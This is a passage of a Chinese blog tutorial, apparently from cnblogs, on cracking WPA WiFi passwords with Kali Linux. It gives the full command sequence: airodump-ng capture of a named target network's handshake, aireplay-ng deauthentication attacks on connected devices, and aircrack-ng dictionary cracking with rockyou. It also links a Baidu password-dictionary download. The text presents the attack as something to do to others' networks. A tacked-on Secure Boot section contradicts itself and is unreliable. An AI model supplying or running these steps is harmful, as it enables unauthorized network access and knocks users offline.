&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;DATA&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;数据量，越大使用的人就越多&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;CH&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;信道频率（频道）&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;321&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;&lt;strong&gt;ESSID&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;center&quot; width=&quot;453&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;wifi&lt;span&gt;的名称，中文可能会有乱码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;(5).抓包&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;接着输入&lt;/span&gt;airodump-ng --bssid BSSID -c 信道频率 -w 抓包存储的路径 wlan0mon。注，--bssid后面跟着的是'&lt;strong&gt;BSSID(MAC地址)&lt;/strong&gt;'，-c后面跟着的是'&lt;strong&gt;CH(信道)&lt;/strong&gt;'&lt;strong&gt;,&lt;/strong&gt;-w后面跟着抓到的包保存到哪，最后是网卡信息'wlan0mon'。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;如：我想要破解&lt;/span&gt;ESSID为TP-LINK_961A4A的无线wifi,格式为：&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~# &lt;strong&gt;airodump-ng --bssid 38:83:45:96:1A:4A -c  -w /opt/catchWiFi wlan0mon&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;数据包已经正在抓取&lt;/span&gt;,等待一会，如果抓取不到数据.接着往下看&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061229844-554548700.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;另起终端，输入格式为&lt;/span&gt;'airepaly-ng -0 0 -c STATION(任选其一) -a bssid 网卡名(一般为wlan0mon)'。不过STATION最好选择手机的热点，如果不清楚手机的mac地址那么可以任选其一，选择手机的好处是可以手动设置断线，让其抓取到包。如果运气不好，那么就试四个把。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061254784-1842749173.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;如：我想要攻击&lt;/span&gt;STATION(MAC地址)为,格式为：&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#  &lt;strong&gt;aireplay-ng -0 0 -c 38:83:45:96:1A:4A -a 14:95:CE:BB:53:A8 wlan0mon&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt;  &lt;span&gt;每个参数的意义&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr readability=&quot;11.5&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;span&gt;(0 WiFi&lt;span&gt;设备无限次数&lt;/span&gt;&lt;span&gt;,-0 8&lt;/span&gt;&lt;span&gt;则攻击&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送&lt;/span&gt;&lt;span&gt;tcp&lt;/span&gt;&lt;span&gt;包（里面包含加密的密码数据），我方伪装成&lt;/span&gt;&lt;span&gt;WiFi&lt;/span&gt;&lt;span&gt;热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的&lt;/span&gt;&lt;span&gt;WiFi&lt;/span&gt;&lt;span&gt;密码&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;数据包里面的密码是哈希加密的，哈希加密只能正向&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061321665-1437640558.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;当&lt;/span&gt;'airodump-ng --bssid BSSID'窗口出现WPA handshake时，表示抓包成功。这里有一个小技巧让其抓到包，让手机连接的wifi断开，然后重新连接wifi。简单说，把手机WiFi重新关开即可。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;出现&lt;/span&gt;'WPA handshake时'时，需要让两个终端都按Ctrl+c停止，不然会一直断网的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061342716-1799343363.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;/span&gt;&lt;span&gt;  &lt;span&gt;查看抓到的数据包&lt;/span&gt;.cd打开抓包的目录，ls列出来，就看到我们抓到的数据包&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061357793-436984077.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(6).解压kali字典文件&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;解压&lt;/span&gt;kali自带的字典文件.路径：/usr/share/wordlists/rockyou.txt.gz&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~# &lt;strong&gt;gzip -d/usr/share/wordlists/rockyou.txt.gz&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061429719-1624407841.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;(7).跑包(破解密码)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;格式：&lt;/span&gt;aircrack-ng -w 字典路径 握手包路径，回车后开始爆破。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;运气有一些差，抓到了三个&lt;/span&gt;cap包，一个没跑成功。但是怎么能放弃，毛主席说过，没有条件创造条件。如果抱着一定要跑出来的决心，就接着往下看。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;&lt;span&gt;root@kali:~# &lt;strong&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt /opt/catchWifi-01.cap&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;root@kali:~#&lt;strong&gt; aircrack-ng -w /usr/share/wordlists/rockyou.txt /opt/catchWifi-02.cap&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;root@kali:~# &lt;strong&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt /opt/catchWifi-03.cap&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061454538-1128167433.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061612357-1711439971.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061647267-1015419361.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;span&gt;  &lt;span&gt;方法，就是把我们正确的&lt;/span&gt;wifi密码加入到'密码字典(rockyou.txt)'中去。然后重新来一次，跑包。成功了。。。。。。。&lt;/span&gt;&lt;/p&gt;
&lt;table border=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tbody readability=&quot;1.5&quot;&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td valign=&quot;center&quot; width=&quot;775&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span&gt;#&lt;span&gt;添加&lt;/span&gt;&lt;span&gt;'root123..'&lt;/span&gt;&lt;span&gt;到&lt;/span&gt;&lt;span&gt;rockyou&lt;/span&gt;&lt;span&gt;密码字典中&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;root@kali:~# &lt;strong&gt;vim /usr/share/wordlists/rockyou.txt&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;root123..&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061705789-974373017.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;strong&gt;&lt;span&gt;特别说明：暴力破解并不简单，需要足够强大的字典和时间，可以通过字典生成工具生成自己的字典，字典越强大越容易破解。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;  &lt;span&gt;其它密码字典：&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;链接&lt;/span&gt;:https://pan.baidu.com/s/1dL_AqQ4nBb5eBJHA47Eq1g &lt;span&gt;提取码&lt;/span&gt;&lt;span&gt;:23fp&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;[1].传统方式'安全启动功能开启'具体操作步骤往下看：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;选择&lt;/span&gt;[Secure Boot Control]项目(3)，并设定为[Disabled](4)。部分机种可能只有[Secure Boot]而没有[Secure Boot Control]，则请选择[Secure Boot]并设定为[Enabled]。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061738161-2067524396.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;[2].UEFI方式'安全启动功能开启'具体操作步骤往下看：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;span&gt;选择&lt;/span&gt;[Secure Boot Control]项目(4)，并设定为[Disabled](5)。部分机种可能只有[Secure Boot]而没有[Secure Boot Control]，则请选择[Secure Boot]并设定为[Enabled]。看右手有保存的提示，华硕的是F10保存。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061800026-1532263133.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1617215/202012/1617215-20201221061835152-1983462561.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 20 Dec 2020 22:23:00 +0000</pubDate>
<dc:creator>HOsystem</dc:creator>
<og:description>环境准备： 方式一(选择该方式)：Kali Linux、笔记本一台、U盘(至少8G) 方式二：Kali Linux、外置网卡、笔记本一台、VM 特别说明，主要是使用方式一进行破解，如果有外置网卡，那就</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/HOsystem/p/14166230.html</dc:identifier>
</item>
</channel>
</rss>